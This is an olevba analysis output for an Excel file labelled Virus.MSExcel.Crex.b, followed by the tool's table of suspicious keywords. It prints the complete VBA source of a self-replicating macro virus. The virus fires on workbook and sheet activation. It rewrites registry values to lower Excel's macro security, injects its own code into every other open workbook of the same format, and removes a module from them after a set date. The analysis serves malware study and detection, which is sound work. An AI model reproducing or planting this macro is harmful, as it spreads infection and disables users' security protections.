olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Crex.b.xls
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSExcel.Crex.b.xls 
in file: Virus.MSExcel.Crex.b.xls - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'mcrex
'1001010001101
Sub Workbook_Activate()
On Error Resume Next
Dim i, intIndex As Integer
Dim data
Dim WshShell, objxl, wbksource As Object
Set wbksource = ThisWorkbook.VBProject.VBComponents.Item("thisworkbook").CodeModule
data = Array("HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel\Options6", 0, "HKCU\Software\Microsoft\Office\9.0\Excel\Security\Level", 1)
Set objxl = GetObject(, "excel.application")
If Left(objxl.Version, 1) <> "8" Then i = 2
Set WshShell = CreateObject("WScript.Shell")
If WshShell.Regread(data(i)) <> data(i + 1) Then WshShell.RegWrite data(i), data(i + 1), "REG_DWORD"
For Each objxl In Application.Workbooks
     If UCase(objxl.Name) <> UCase(ThisWorkbook.Name) Then
         If Date > #1/2/2004# Then objxl.VBProject.VBComponents.Remove objxl.VBProject.VBComponents("universelle")
         'If UCase(Right(objxl.Name, 3)) = "XLS" Then
         If objxl.FileFormat = ThisWorkbook.FileFormat Then
            With objxl.VBProject.VBComponents("thisworkbook")
                If .CodeModule.Find("1001010001101", 1, 1, 10000, 10000) = False Then
                    If .CodeModule.Find("Workbook_activate", 1, 1, 10000, 10000) = False Then
                        For i = 1 To wbksource.CountOfLines
                            If wbksource.Lines(i, 1) = "'mcrex" Then
                                Exit For
                            End If
                        Next i
                        intIndex = 0
                        Do
                            .CodeModule.InsertLines 1 + .CodeModule.CountOfLines, wbksource.Lines(i + intIndex, 1)
                            intIndex = intIndex + 1
                        Loop Until wbksource.Lines(i + intIndex, 1) = "'mcrex"
                        .CodeModule.InsertLines 1 + .CodeModule.CountOfLines, wbksource.Lines(i + intIndex, 1)
                    End If
                End If
            End With
        End If
     End If
Next objxl
Set WshShell = Nothing
Set objxl = Nothing
Set wbksource = Nothing
End Sub
Sub Workbook_SheetActivate(ByVal Sh As Object)
Workbook_Activate
End Sub
Sub Workbook_SheetCalculate(ByVal Sh As Object)
Workbook_Activate
End Sub
'mcrex
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Activate   |Runs when the Excel Workbook is opened       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Regread             |May read registry keys                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

